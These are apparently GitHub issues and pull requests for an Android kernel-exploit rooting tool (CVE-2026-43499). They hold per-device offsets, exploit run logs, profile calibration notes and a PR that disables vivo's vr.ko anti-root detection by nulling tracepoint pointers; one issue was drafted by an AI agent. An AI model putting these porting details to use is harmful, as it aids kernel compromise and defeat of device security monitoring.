items.title: X200 Ultra kernel 6.6: vr.ko tag clearing overlaps thread_info.cpu
items.body:
# X200 Ultra kernel 6.6: `vr.ko` tag clearing overlaps `thread_info.cpu`

Hello,

I am reviewing the `vr.ko` mitigation in the `cve_2026_43499` backend for the vivo X200 Ultra, whose kernel is `6.6.89-android15-8-g1f71897ac249-abogki467805059-4k`. The mitigation's aligned eight-byte clear appears to overlap `thread_info.cpu` in the BTF layout of the analyzed X200 Ultra kernel Image.

## BTF layout evidence

The Image BTF reports:

```text
struct task_struct: size 4800; thread_info at byte offset 0
struct thread_info: size 48
  cpu: byte offset 40 (0x28), type u32
```

Therefore, the eight-byte word at `task_struct + 0x28` contains `thread_info.cpu` at `+0x28..+0x2b` and the following four bytes at `+0x2c..+0x2f`.

In the W2 `vr.ko` mitigation, the code clears the aligned word at:

```text
align_down(child_task + 0x2c, 8) = child_task + 0x28
```

That zero write includes the `cpu` field; it is not limited to padding. The analyzed Image corresponds to the X200 Ultra 6.6.89 kernel release above. This is static BTF evidence; we have not executed the exploit or observed this write on the device.

The W2 block in the `pre-release` source is also present in the `vivo-test` source:

- [pre-release backend](https://github.com/YuKongA/ghostlock-app/blob/dae813829354aa2758d85fb750293bd58a6f3f0a/src/core/session/backend/cve_2026_43499_backend.cpp#L145-L216)
- [vivo-test backend](https://github.com/YuKongA/ghostlock-app/blob/583b13f/src/core/session/backend/cve_2026_43499_backend.cpp#L148-L218)
- [tag definitions](https://github.com/YuKongA/ghostlock-app/blob/dae813829354aa2758d85fb750293bd58a6f3f0a/src/core/profile/macros.h#L4-L10)

## Questions

Could you confirm whether this clear is safe for the X200 Ultra's 6.6 task layout? If it is not, is a version/BTF-aware guard, a different tag location, or a safe way to skip this mitigation planned? Please share the validation basis and the release or commit that will contain the adaptation.

Until this overlap is explained or corrected for this kernel layout, we are treating the `vr.ko` path as a blocker and will not run the exploit on the device. No runtime failure or damage is being reported; the concern is that the planned write overlaps a live `u32` field according to the Image BTF.

Hi,

Would support for the TCL C855 V643 firmware be within the scope of this project?

## Device information

- Device: TCL C855 television
- Firmware: V643
- SoC: MediaTek MT5896
- Architecture: arm64
- Kernel release: `5.15.180-android14-11`
- Kernel branch: Android `android14-11`
- Raw kernel SHA-256:
  `87c44c635103044f93c0bbb6cbf34b988a3668bd7750bbdeea1e7b091603eaea`
- Observed `_text` base: `0xffffffc008000000`

## Static analysis already completed

- Embedded kallsyms were recovered from the firmware.
- A valid embedded BTF header is present in the raw kernel image.
- A reconstructed ELF and symbol map are available.
- The current extractor tests pass locally: 7 passed, 0 failed.
- I have not run `--register` or the exploit on the TV.

## Current compatibility issues

The extractor currently recognizes the 6.1, 6.6 and 6.12 layout families.
For this 5.15 kernel it falls back to `STRUCT_OFFSETS_6_6`.

I also observed that:

- `render_device()` does not emit the BTF-derived `task_struct` offsets;
- the TCL kernel uses a different compact `rt_mutex_waiter` layout;
- the runtime `KIMAGE_TEXT_BASE` differs from the TCL kernel base;
- the MediaTek physical-load fallback does not appear suitable for this image;
- a failed pselect derivation can fall back to the 6.6 heuristic.

Would you be interested in adding Linux 5.15 / Android TV support, or reviewing a
non-executing compatibility patch first?

I can provide sanitized reports, the symbol map, BTF metadata and read-only test
logs. I will not upload the complete proprietary firmware publicly.

Please let me know which artifacts or checks would be useful.

items.title: [MTK] OPPO A3 Pro (PJY110, MT6877) — exploit primitive works but W1 always fails; forcing a different mm_struct_sz turns the safe failure into a kernel panic
items.body:
# [MTK] OPPO A3 Pro (PJY110, MT6877) — exploit primitive works but W1 always fails; forcing a different mm_struct_sz turns the safe failure into a kernel panic

> **⚠️ This issue was drafted and submitted by an AI agent (Hermes Agent), on behalf of a human
> user who performed the on-device testing and approved every step.**
> The device reports, panic records and extractor output quoted below were collected from the real
> hardware and stock OTA by that user; the AI wrote the analysis and the code reading.
> Maintainers: please weigh the technical content on its own merits — both the AI and the user are
> happy to re-run any command or provide raw artifacts to verify any claim here.
> **这是我的 AI 助手（Hermes Agent）代我起草并提交的 issue**，真机测试由我本人操作并逐步确认，
> 下方设备信息、panic 记录与 extractor 输出均取自真实硬件与原厂 OTA；分析与代码阅读由 AI 完成。
> 所有结论都可复现，需要任何原始产物我们都可以提供。

**I have read the docs and I am NOT asking to have this device marked as supported.** This is a report of
analysis results plus a reproducible failure mode that I think is worth documenting, with a
question at the end. I can provide any artifact below on request.

---

## Device / kernel

| | |
|---|---|
| Device | OPPO A3 Pro 5G (PJY110 / OP59FB) |
| SoC | MediaTek MT6877 (Dimensity 7050), `ro.board.platform=mt6877`, arm64-v8a |
| Kernel | `6.6.82-android15-8-o-g3b30dff93dd7-4k` |
| Fingerprint | `OPPO/PJY110/OP59FB:15/AP3A.240617.008/U.21d31d5-2:user/release-keys` |
| Build | `PJY110_15.0.0.1600(CN01)`, security patch 2026-01-01 (boot.img built 2025-12-30) |
| CPU topology | cpu0-5 @ 2.0 GHz (little), cpu6-7 @ 2.6 GHz (big) — 6+2 big.LITTLE |
| Bootloader | `ro.boot.flash.locked=1`, `verifiedbootstate=green`, `veritymode=enforcing` (stock, no root) |
| App | built from `main` @ `289b5c6` (v1.2), arm64 |

Not present in the 72 bundled profiles in `app/src/main/assets/kernel_profiles/`.

## What works

The exploit primitive and the derived offsets are fine:

```
$ ghostlock-extract boot.img --iomem /dev/null --analysis
info: kallsyms layout 6.4+ recovered (116352 symbols)
info: (CVE-2026-43499 primitive present (remove_waiter@0x105b25c still uses current)
info: MediaTek compressed image; _text confirms kernel_phys_load=0x80000000 (DRAM base)
kernel_family           STRUCT_OFFSETS_6_6 (verified Android family)
rt_mutex_waiter         lock=0x58 pi_tree=0x28 task=0x50 tree=0x0 wake_state=0x60 ww_ctx=0x68 size=0x70
mm_struct size          0x4c0
primitive               remove_waiter@0x105b25c unpatched
pselect chain           derived shift=-2 waiter=0x90 chain=__arm64_sys_pselect6->core_sys_select
path multicast_waiter   available (ip_mc_msfadd=absent ip_mc_source@0xffffffc080ee87c0)
path select_stack       available (core_sys_select@0xffffffc0803dfcdc futex_wait@0xffffffc0801a50d4)
path tcp_zerocopy       available (tcp_zerocopy_receive@0xffffffc080ea8e04)
suggested route         select_stack (high)
```

I verified the embedded BTF is intact and self-consistent (decompressed vmlinux, `.BTF` section at
offset `0x175e8e8`, ver=1, 24 + 4047120 + 2479978 = **6,527,122 bytes**, matching the extractor's
reported `btf_size` exactly), so `sizeof(mm_struct)=0x4c0` etc. are real BTF values, not guesses.

At runtime the spray and leak both succeed:

```
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +120ms
[*] [spray] finding futex collisions... +289ms
[*] [spray] futex collisions found +760ms
[*] [spray] mm_struct leaked=0xffffff80d7ca9e00 +822ms
[*] [spray] mm_struct leaked=0xffffff80f3208a00 +939ms
[*] [spray] mm_struct leaked=0xffffff8157600a00 +933ms
[*] [spray] payload ready +823ms
```

**No kernel panic.** `kernel_phys_load` is fine despite MediaTek: `_text` delta confirms
`0x80000000`, and the fallback is self-consistent (text − phys = −0x4000000000 = VA_BITS=39 +
KASLR base).

## What always fails

```
[-] page ffffff80d7ca8000 stores an even byte over selinux_state.initialized; taking another
[-] page ffffff80f3208a00 stores an even byte over selinux_state.initialized; taking another
[-] page ffffff8157600000 stores an even byte over selinux_state.initialized; taking another
[-] prepare_kernel_page retry 2/4 +2959ms
[-] prepare_kernel_page retry 3/4 +4014ms
[-] prepare_kernel_page retry 4/4 +4966ms
[-] W1: SELinux attempt 15 route failed; backing off
[-] Write 1 failed
[-] heap spray failed
result: exploit failed (exit code=1)
```

`run_state.json` stops at `"w1a": "in_progress"`.

I read the source and I believe I understand the mechanism:

- `prepare_kernel_page()` (`src/core/support/util.cpp:621`) does
  `base = leaked & ~(ORDER3_SIZE - 1)` with `ORDER3_SIZE = 0x8000`.
- `payload_write_layout()` (`src/core/memory/payload_builder.cpp:68`) sets
  `layout.right = page_base + 0x100` for `WriteMode::Zero && preserve_child`.
- The gate `payload_write_layout_accepts_page()` (`payload_builder.cpp:96`) rejects when
  `((layout->right >> 16) & 1) == 0`. Since `0x100 < 0x10000`, this is effectively
  `(base >> 16) & 1 == 0`.

With a `0x8000`-aligned base, bit16 is 1 only for N ≡ 2,3 (mod 4) — i.e. the gate passes for
roughly half of the 0x8000 slots. **It is not structurally unreachable**, but on this unit all
observed leaks landed on a slot where bit16 = 0:

| run | leaked `mm_struct` | base | `(base>>16)&1` | gate |
|---|---|---|---|---|
| 1 | `0xffffff80d7ca9e00` | `0xffffff80d7ca8000` | 0 | reject |
| 2 | `0xffffff80f3208a00` | `0xffffff80f3208000` | 0 | reject |
| 3 | `0xffffff8157600a00` | `0xffffff8157600000` | 0 | reject |

For comparison, issue #249 (a different MTK 6.6 device) shows the same code path *passing* once
(`leaked=0xffffff8005193700` → `base=0xffffff8005190000` → `(base>>16)&1 = 1` → `prepare_kernel_page ok`)
and then rejecting on 8+ other attempts whose bases had bit16 = 0. So the gate is a genuine
probabilistic filter, and that device's success rate is visibly low.

Widening `execution.heap.prepare_max_attempts` from 4 to 40 changed nothing here — and reading the
KernelSnitch retry path, it only retries when the whole attempt failed anyway, so that knob cannot
help this particular gate.

**I now understand this gate is a safety net, not an obstacle**, so I stopped trying to widen it —
see the next section for what happened when I did try to change the slot phase directly.

## The reproducible panic (this is the part I think is interesting)

Following the "device SLUB stride vs BTF sizeof" note (`tools/extract_rs/src/report.rs:69`:
`0x400 is the device SLUB stride, not the BTF 0x3c0`), I set `kernelsnitch.mm_struct_sz = 1216`
in the imported profile (i.e. the BTF `sizeof`, instead of letting the 6.6 path fall back to the
compiled-in `MM_STRUCT_SZ = 0x500`). My intent was to shift the KernelSnitch scan stride so the
leak would land on a different slot phase and pass the gate.

Result: the previously **safe** failure (exit code 1, device keeps running) became a **kernel
panic**. Three runs, two of them with different CPU pairs:

```
KEYINFO= Unable to handle kernel paging request at virtual address ffffff8457b58000
KEYINFO= Unable to handle kernel paging request at virtual address ffffff8457b58000
KEYINFO= Unable to handle kernel paging request at virtual address ffffff86c7fb0000

stackhash (all three): efab135179c71fbb603e31e41df8c10588efe84754d25cbe6880da1437362528
FST_FRAME=mrdump_common_die+0x288/0x3a8
COMM=libghostlock.so
mModule = CriticalLogKernel  mIssue = panic
```

(Evidence note: Oppo's `BootReceiver` only keeps the *most recent* panic record, so the third line
is the one re-readable via `adb logcat -d -b all | grep KEYINFO=`; the first two were read
immediately after each of their own reboots. The stackhash was identical in all three.)

Observations:

- stackhash identical across runs with **different CPU pairs (6,7 and 0,1)** and different retry
  counts ⇒ the failure point is deterministic; CPU pair and retry counts are not the variables.
- The faulting address is **~16 GB above** the leaked direct-map addresses
  (`0xffffff84...` vs `0xffffff80...`), so it is not a small offset error — something dereferenced
  an unmapped kernel VA.
- Setting `mm_struct_sz` to the BTF value changed the KernelSnitch scan stride
  (`kernelsnitch.h:260`: `mm_struct_candidate += ks->mm_struct_sz`). I had assumed
  `mm_struct_stride()` would take my override — it does not for 6.6 (`profile-core`/native only
  consults `mm_struct_sz` for the android14-6.1 family; `kernelsnitch-6x.conf` documents it as an
  explicit `null` for other families), so my value changed the scan phase in a way I had not
  modelled and the run latched onto a position that passed the gate but was not a real `mm_struct`.

So my read is: with the shipped default (`mm_struct_sz` unset ⇒ 0x500) the leak lands on a slot the
gate rejects → **safe failure**; my override moved the scan onto a false-positive that passed the
gate → write to unmapped VA → panic. **The default is the safer configuration, and I have reverted
to it.**

## My question

1. Is my reading of the gate correct — that `((right >> 16) & 1)` passes for ~half of the 0x8000
   slots, so W1 on this kernel is a **low-probability** pass rather than an impossible one? And if
   so, is there a supported way to *shift the leak's slot phase* (so fewer attempts are wasted on
   bit16 = 0 slots) — e.g. a profile field or route I have missed? Issue #249 looks like the same
   situation on a different MTK 6.6 device (1 pass, 8+ rejects), and I could not find a knob for it.
   I deliberately did **not** retry in a loop after the panic described above, because I do not want
   to keep panicking the device if the answer is "that phase is not tunable".

2. Given MEDIATEK.md requires `/proc/iomem` + `/proc/kallsyms` from an *already rooted* device to
   fill in the two physical addresses, is there any supported path to bootstrap a device like this
   one (PJY110) that has no bundled profile and no pre-existing root? On this unit shell and
   Shizuku both get `Permission denied` on `/proc/iomem` and `/proc/kallsyms` (readable only by
   root), so the mtk-phys route is circular for a first-time root. For what it's worth,
   `kernel_phys_load` did not appear to be the blocker here — the `_text`-derived `0x80000000`
   looked self-consistent and the run got all the way to the W1 gate.

3. Would you want a `SUPPORTED_DEVICES.md` entry for the *negative* result (primitive present but
   W1 unreachable / extremely low pass rate), so other PJY110 / MT6877 users don't repeat the same
   search? Happy to send a PR if so — no profile would be shipped, since I have not verified a
   successful run.

## Reproduce / artifacts I can provide

Everything below is ready and I can attach or paste on request (all generated from the stock
`PJY110domestic_11_15.0.0.1600CN01_2026010716160222.zip` OTA, nothing from a modified device):

- full `ghostlock-extract --analysis` text and `--format json` output
- the generated `PJY110-6.6.82.conf`
- full `logcat -b all` capture of a run up to the panic (25k lines)
- the extracted `boot.img` kernel segment and the parsed `.BTF` header
- `run_state.json` from each attempt

Environment used: `main` @ `289b5c6`, `./gradlew :app:assembleDebug` (AGP 9.1.0, Kotlin 2.4.20,
NDK r28, `platforms;android-37.2`), no source modifications beyond a local `local.properties`.

Thanks for the work on this — the extractor's BTF handling and the fail-closed profile validation
made this analysis possible without ever needing to guess at offsets.

items.body:
## 📝 变更摘要

本 PR 为 vivo vr.ko 反 Root 检测提供**稳定性强化 v2**方案，相比之前的 PR #241 设计有重大改进：

### 核心改进

1. **全局熔断机制**（`vr1` 步骤）：NULL 掉 `sys_exit_tp_funcs` 指针而非重定向到 probestub
   - `__DO_TRACE` 已有 `if (it_func_ptr)` 守卫，NULL 指针使所有 sys_exit 探针变为 no-op
   - 完全绕过 tracepoint 结构体布局假设（CONFIG_HAVE_STATIC_CALL 影响 funcs 偏移达 0x28 字节）
   - 纯数据写入，幂等，KCFI 兼容
   - 仅需 profile 提供 `sys_exit_tp_funcs` 偏移，运行时单次写直到重启

2. **增强重试循环**（`w2b` 步骤）：
   - flags+tagA 清除增加重试循环（与 W2 相同节奏）
   - tagB 清除增加重试循环（64 位对齐）
   - 避免因单次 race 丢失导致整个 chain round 浪费

3. **探测逻辑优化**：
   - `/proc/modules` 探测移到 `vr1` 步骤，每进程只运行一次
   - 结果共享给 `w2b` 的 per-task tag clear

### 新增设备 Profile

- **PD2463** (iQOO Neo10 Pro+): `6.6.89-android15-8-g1f71897ac249-abogki467805059-4k`
  - `sys_exit_tp_funcs = 36315752` (0xffffffc0822a2268)
  - 经 BTF + 静态数据交叉验证

- **iQOO15**: `6.12.58-android16-6-g0a092cc0037a-abogki521987229-4k`
  - `sys_exit_tp_funcs = 40735656` (0xffffffc0826d93a8)
  - 经 BTF 验证

> ⚠️ **重要说明**：新 profile 的 task_struct 偏移是从最接近的现有 profile 复制的，应在实机使用前用设备 BTF 交叉验证。

---

## 🛠️ 技术细节

### sys_exit_tp_funcs 设计哲学

| 方面 | PR #241 (旧) | v2 (新) |
|------|--------------|----------|
| 方法 | 重定向 probestub | NULL funcs 指针 |
| 依赖 | tracepoint 结构布局 | 无结构体假设 |
| 安全性 | 需验证 probestub 地址 | 简单 NULL 写入 |
| 幂等性 | 需回读验证 | 天然幂等 |
| CONFIG_HAVE_STATIC_CALL | 需处理布局差异 | 不受影响 |
| 复杂度 | 扫描 + 匹配 + 回写 | 单次写 |

### 实现路径

```
W1 (SELinux) → vr1 (全局熔断) → W2 (凭据) → W3 (seccomp) → handoff
```

- `vr1` 在 victim spawn 之前运行，确保 step 协议严格串行
- 全局熔断覆盖 root shell 和 late-load helper，per-task clear 无法触及的范围

```hocon
}

release = "6.1.157-android14-11-o-gc2dad16af736"
schema_version = 1
kernel_major = 6
recommend_shizuku = 0
kernel_phys_load = 1073741824
kernel_phys_offset = 1073741824
# 2026-10-02 帧深校准: tcp zc 落点与 waiter 相距 0x1CA 无法重叠 (6.6 才有 Δ=-8)
# select_stack: LOCK_PI waiter(S-0x1F8) 与 pselect6 位图(S-0x200) 仅差 8 字节 = word 1
# 引擎语义 global = shift + waiter_word, tree_pc(w2) 须落 word 1 → shift = -1
route {
  multicast_waiter {
    # 2026-10-02 反汇编硬校准 (源码+真机双重验证):
    # WAIT_REQUEUE_PI 真实链 = sys_futex(0x80)+do_futex(0x60)+futex_wait_requeue_pi(0x1b0)
    # = 3帧 0x290 (源码 do_futex 直连, 无中间 futex_wait 帧; 之前的 0x70 帧是错误假设)
    # rt_waiter = requeue_pi 帧内 sp+0x98 (真机反汇编: memset(sp+0x98,0,0x58)
    #   + 双重自引用 RB_CLEAR_NODE + task=NULL@+0x30 → 内联 rt_mutex_init_waiter 实锤)
    # → ghost = S-0x290+0x98 = S-0x1F8 (与 LOCK_PI 路径同一深度, conf 旧注释自证)
    # setsockopt 链 (push 帧修正后): wrapper(stp[sp,#-16]! = 16)
    #   + __sys(0x60) + do_ip(push 96 + sub 0x230 = 0x290)
    #   → do_ip sp = S-0x10-0x60-0x290 = S-0x300
    # greqs(264B, group_source_req) @ do_ip sp+0x18 = [S-0x2E8, S-0x1E0)
    # → ghost(S-0x1F8) 起始偏移 = 0x2E8-0x1F8 = 0xF0 = 240
    # ghost 尾 72B 出界: tree_entry(24B)@240..263 恰好收进缓冲尾;
    #   pi_tree_entry/task/lock @264+ 覆盖不到 = 保持内核真值
    #   → 链走锁真锁 → 伪造移植写 → task 自环 → 安全返回 (旧值 128 基于漏测的 push 帧)
    # task/lock 偏移 = 6.1 rt_mutex_waiter: task@+0x30 lock@+0x38 (BTF 实测; 仅作布局描述)
    waiter_off = 240
    buffer_size = 264
    task_offset = 48
    lock_offset = 56
  }
  select_stack {
    # 2026-10-02 反汇编硬校准:
    # LOCK_PI 链 = sys_futex(0x80)+do_futex(0x60)+futex_lock_pi(0x190)=0x270
    #   rt_waiter @ lock_pi 帧 sp+0xD0 (sub x5,x29,#0x60, x29=sp+0x130 实锤)
    #   → ghost = S-0x270+0xD0 = S-0x1A0 (旧值 S-0x1F8 基于 0x70 假帧, 作废)
    # pselect6 链 = wrapper(0x90)+core_sys_select(0x1e0)=0x270
    #   stack_fds 清零区 @ core_sys sp+0x70 → 位图基址 = S-0x200 ✓

    # 树放置首跳必读 waiter->lock → 读到 res 区垃圾/0 → 无法携带 W1 写

    # 保留反汇编校准值供参考
    waiter_shift = 10

  }

fallback {
  to = "tcp_zerocopy"
```

- ✅ profile 字段校验全过（`invalid=0`），运行时推导 `soc: mtk; kernel_phys_load=0x80000000`，delta=0
- ✅ p0 地址逐项核对：`init_task=ffffff800203fc00 / root_tg=ffffff800222a580 / bootid=ffffff80023a0288` 与 profile 一致
- ✅ kernelsnitch 正常：mm spray → futex collisions → mm_struct 泄漏成功（mm_struct_sz=1024 有效）
- ✅ W1 (SELinux) 通过（偶数字节问题是概率性的，多次实测可通过）
- ✅ `tcp route enter` 正常进场（`attempts=2000 arm=64 hold=100000`，consumer=cpu1/5 均可）
- ⚠️ **tcp 竞态输掉时直接内核 panic 重启**（多次复现，重启后正常开机）；日志止于 route enter 属正常现象
- ❌ select_stack 回退路线在本机几何不可行：`futex waiter starts 13 qwords above the fd_set buffer; max feasible shift is 3`——与 ghostlock-oneplus 的 "OPLUS 6.1: sys_futex → fwrpi (PGO inlined) ❌ waiter word=13+" 结论一致（已在本机内核独立验证：`__arm64_sys_futex` 直调 `futex_wait_requeue_pi` 绕过 `do_futex`）

- kallsyms 全量解码 110,975 符号（与你们解析器输出逐项一致：token_table@0x1469cb8 / markers@0x1418170 / offsets@0x1237be8）

items.title: [Device Support] HONOR Magic7 Lite (BRP-N21M, SM6450, kernel 5.10.252) - CPU picker default (4,5) is outside the app's own cpuset, which silently breaks KernelSnitch
items.body:
## TL;DR

Two separate things, both worth a look:

1. **A concrete bug with a clean workaround:** the app defaults the CPU pair to **4,5** on this device, but the
   app process's `Cpus_allowed_list` is **`0-3,6-7`**. The exploit therefore hits
   `SYSCHK(sched_setaffinity(0, sizeof(cpu_set_t), &cpuset)): Invalid argument` **hundreds of times**, and the
   KernelSnitch `mm_struct` leak then fails on every attempt. **Selecting the `6,7 · 2.21 GHz` pair in the
   picker removes all EINVAL errors and the leak starts succeeding** (`0xffffff87a68cbc00`,
   `0xffffff87f826f800`) — though only intermittently (roughly a quarter to a half of attempts).

2. **What remains after the workaround:** the leak's hit rate is low, and the runs that do leak a valid
   `mm_struct` then stop at `prepare_kernel_page`'s even-byte rejection
   (`page ... stores an even byte over selinux_state.initialized; taking another`). No run so far has reached
   the `multicast_waiter` route stage. There is **no kernel panic** — the process just exits
   (`code=1`, or `code=137` once under memory pressure).

---

## 1. The CPU-pair / cpuset mismatch (the actionable finding)

App process cpuset on this device:

```
$ adb shell cat /proc/$(pidof com.ghostlock.app)/status | grep Cpus_allowed_list
Cpus_allowed_list:	0-3,6-7
```

The app's own CPU picker offers three pairs, and **the first one (which is selected by default here) is not in
that set**:

```
4,5 · 2.21 GHz     <-- default selected
6,7 · 2.21 GHz     <-- inside 0-3,6-7
0,1 · 1.80 GHz     <-- inside 0-3,6-7
```

CPU topology on the device:

```
possible : 0-7      present : 0-7      online : 0-7
cpu0-3   : 1804800 kHz
cpu4-7   : 2208000 kHz
nproc    : 6
```

With the default pair the log fills with these (a single run produced over a hundred):

```
[!] SYSCHK(sched_setaffinity(0, sizeof(cpu_set_t), &cpuset)): Invalid argument
```

and the leak never succeeds:

```
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +125ms
[*] [spray] finding futex collisions... +271ms
[*] [spray] early collision screen 12/7 at 31%
[*] [spray] futex collisions found +776ms
[*] [spray] mm_struct leaked=0xffffffffffffffff +3186ms
[-] KernelSnitch mm_struct leak failed
   ... same on all four prepare_kernel_page attempts ...
[-]   heap spray failed
[-] W1: SELinux attempt 1 route failed; backing off
[-] Write 1 failed
<b> native exited code=1
```

After selecting `6,7` in the picker (verified: the main screen then reads `CPU cores  6,7 · 2.21 GHz`):

```
[*] cpu pair: main=6 consumer=7
[*] main thread running on cpu=6
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +127ms
[*] [spray] mm_struct leaked=0xffffff87a68cbc00 +737ms     <-- valid
[*] [spray] mm_struct leaked=0xffffff87f826f800 +1037ms    <-- valid
```

**EINVAL count went from >100 to 0**, and valid leaks appeared. This looks like a genuine defect in how the
recommended/selected CPU pair is chosen for this device: the pair the picker defaults to is outside the process
cpuset, so the affinity calls fail and the timing-sensitive leak cannot work. Whether the picker should filter
to the current cpuset (or the resolver should prefer a pair inside it) is a maintainer decision, but it is easy
to reproduce and, from a user's perspective, looks like "the app says Supported but the exploit never works".

## 2. What still fails after the workaround

Three runs with the `6,7` pair:

| run | cpuset EINVAL | `mm_struct` leaks | outcome |
|---|---|---|---|
| 1 | 0 | all `0xffffffffffffffff` | `native exited code=137` (SIGKILL, during a spray) |
| 2 | 0 | 1 valid, 3 failed | `prepare_kernel_page` retries exhausted, `exit code=1` |
| 3 | 0 | all `0xffffffffffffffff` | `prepare_kernel_page` retries exhausted, `exit code=1` |

In the run where a valid `mm_struct` did appear, the next stage rejected the candidate page:

```
[-] page ffffff87f8268000 stores an even byte over selinux_state.initialized; taking another
[-] prepare_kernel_page retry 2/4 +1945ms
```

So the KernelSnitch hit rate itself is the limiting factor now, plus the repeated
`selinux_state.initialized` rejection. Notably this is the same pair of symptoms reported for the HONOR 400
Smart in #372 (`prepare_kernel_page` even-byte rejection, then a route-stage failure), so the two devices may
share a cause.

Relevant kernel config for this device (from the boot image):

```
CONFIG_KASAN=y
CONFIG_KASAN_HW_TAGS=y
CONFIG_SLUB=y / CONFIG_SLUB_DEBUG=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_ARM64_4K_PAGES=y / CONFIG_ARM64_VA_BITS=39
```

`kernelsnitch.mm_struct_sz` was tried at 512 and 4096 as well as the default 1024; none changed the hit rate
appreciably.

---

## The profile I built (so the device is reproducible)

`ghostlock-extract` on this kernel's `boot.img`:

```
primitive                remove_waiter@0x1ecf3c unpatched          <-- CVE present
rt_mutex_waiter          (no rt_mutex_waiter type in BTF)
mm_struct size           (unavailable)
pselect chain            not attempted (no embedded BTF)
path multicast_waiter    available (ip_mc_msfadd=absent ip_mc_source@0xffffffc0094c6f78)
path select_stack        available (core_sys_select@0xffffffc00857193c futex_wait@0xffffffc008292fc0)
path tcp_zerocopy        available (tcp_zerocopy_receive@0xffffffc00946f788)
suggested route          multicast_waiter (medium)
reasons                  - 5.x kernel with the multicast path present
                         - pselect route not derivable on this layout
info: multicast waiter_off derived = 0x150 (setsockopt depth 0x360 - futex depth 0x210)
warning: 5.10.252-... is unverified; no family-derived geometry will be emitted
warning: embedded BTF not found; struct offsets fall back to target.h defaults
warning: credential template omitted; the built-in profile must supply it
```

The extractor's `waiter_off = 0x150` (336) cannot be used as written — PROFILE_SCHEMA requires
`waiter_off + lock_offset + 8 <= buffer_size`, and with the bundled 5.15 multicast `buffer_size = 264` that is
336 + 56 + 8 = 400 > 264. So the route fields use the values all five bundled 5.15 multicast profiles agree on
(`waiter_off=96`, `buffer_size=264`, `task_offset=48`, `lock_offset=56`), which also keeps the trio consistent

items.body:
Hi, I'm trying to get GhostLock working on a Redmi Note 11 Pro 5G / POCO X4 Pro 5G (`veux`) running HyperOS `OS1.0.10.0.TKCIDXM` with kernel `5.4.274-qgki-g82179e362f33` (Snapdragon 695, 8 cores).

## What I did

1. The official extractor couldn't derive struct fields (no BTF in the image), so I manually derived all offsets from disassembly + binary analysis. The profile passes full schema validation and is **accepted by the app** (`hasProfile=true invalid=0`).

2. I hit the "Profile needs correction" banner initially — root cause was that the app merges two validators (`validateProfileFields` + `ProfileResolver.validateMerged`), and the second one requires all 15 `task_struct` fields to be Numbers. I derived the missing ones (`tasks=1368`, `sched_task_group=992`, `atomic_flags=1568`), made `ref_image` signed i64, and set `kernel_phys_offset=0x80000000`. After that the profile loaded cleanly.

3. The exploit starts but **fails at W1 heap spray** — `KernelSnitch mm_struct leak failed`, 4/4 retries, consistently. The futex collisions are found successfully, but `mm_struct leaked=0xffffffffffffffff` every time.

## What I tried for `mm_struct_sz`

- `1024` (copied from the 5.15 miracle profile) — failed
- `1280` (built-in default from `src/core/kernel/constants.hpp`) — failed
- `896` (my calculation from 5.4.274 source: `mm_cache_init()` uses `sizeof(struct mm_struct) + cpumask_size()` with `SLAB_HWCACHE_ALIGN`, so ~880 + 8 = 888 → rounded to 896) — failed
- `960`, `832` — failed

I also extracted the kernel config via IKCONFIG. Relevant options:
```

CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_SHUFFLE_PAGE_ALLOCATOR=y
```

## Question

Is the KernelSnitch heap spray expected to work on 5.4 with `CONFIG_SLAB_FREELIST_RANDOM=y`? The consistent failure across all `mm_struct_sz` values makes me suspect the issue isn't the size but the freelist randomization (or something else 5.4-specific) breaking the stride-based scan.

Is there a known-good `mm_struct_sz` for 5.4, or does GhostLock need changes to support this kernel? Happy to provide the full debug log or the profile file if it helps.

items.title: feat(vrko): vivo vr.ko 中和 + 运行时 boot 镜像提取 + 构建修复（含真机证据）
items.body:
## 这个 PR 做什么

蓝厂（vivo/iQOO）`vr.ko` 反 root 检测的中和，加上让这份树能在**普通 x86_64 主机**上构建成功。

### 1. vr.ko 中和（攻击路径）

- **全局熔断**：把 `__tracepoint_sys_exit->funcs` 写 NULL —— `__DO_TRACE` 的外层守卫是
  `if (it_func_ptr)`，因此所有 `sys_exit` 探针（含 vr.ko 的 kill 路径）对**全系统所有任务**变成空操作，
  不需要知道任何探针地址；数据写入、幂等、与 KCFI 无关。
- **按任务清标记**：W2 校验前清 `thread_info.flags` 字与 tag B（两写都带重试与 settle）。
- 新增 run-state 步骤 `vr1`，Kotlin `RunStateCodec.Steps` 同步。
- profile 新字段 `offset.sys_exit_tp_funcs`：**可选**，只在有值时写出，因此**既有 profile 的 wire 字节一个都不变**。
- 写入守卫：vr1 的全局写与各阶段写都要求目标在 direct map 内且 8 字节对齐，否则拒绝并说明原因。

### 2. 运行时从 boot 镜像提取（`src/core/bootimg/`）

boot header v2/v3/v4 → kallsyms 令牌表 → 内嵌 BTF → LZ4-legacy → cpio newc → vendor_boot 里的 `vr.ko` 探针（tag A/B）。
两条用途：profile 没有 `sys_exit_tp_funcs` 时兜底；以及**任何写入之前**用暂存的 `uefi.img` 交叉校验物理基址
（基址错了会让每个写地址偏移 —— 拒绝运行而不是硬写）。

### 3. 提取器与 App

- `tools/extract_rs`：输出 `sys_exit_tp_funcs`（符号 + BTF 成员**都解析出来才写**）；新增
  `--dump-partition`，本地完整包也能取出 `vendor_boot.img` 供运行时探针使用。
- App：vendor_boot 导入流程（校验 magic 与体积，按运行时读取的名字暂存）；「附加镜像」可附加
  xbl_config / uefi / vendor_boot；两个 native 文件（`libghostlock.so`、`libextract.so`）的生成步骤写进 `构建说明.md`。

### 4. 构建修复（来自真实主机构建）

| 文件 | 修复 |
|---|---|
| `src/core/kernel/constants.hpp` | 先 `#undef PAGE_SIZE / PAGE_SHIFT` 再包含 `offset.h`（宿主/NDK 头同名宏冲突） |
| `gradle.properties` | JDK 安装路径 + 抑制 compileSdk 37.2 的 unsupported 报错（**路径是构建机相关**，换机器需改） |
| `GhostlockViewModel.kt` | `DocumentRequest` 补回 `PayloadImage`（三处引用，缺它编译失败） |

### 5. 真机证据

`docs/evidence/vrko-v8-real-device.md` 与同目录截图：iQOO Neo10 Pro+（vivo PD2463、
`6.6.89-android15-8-g1f71897ac249-abogki467805059-4k`）上 KernelSU 管理器显示
**工作中 [越狱模式]（32601-2, LKM）**，日志尾部 `late-load` / `KernelSU ready` / `result: exploit completed`。
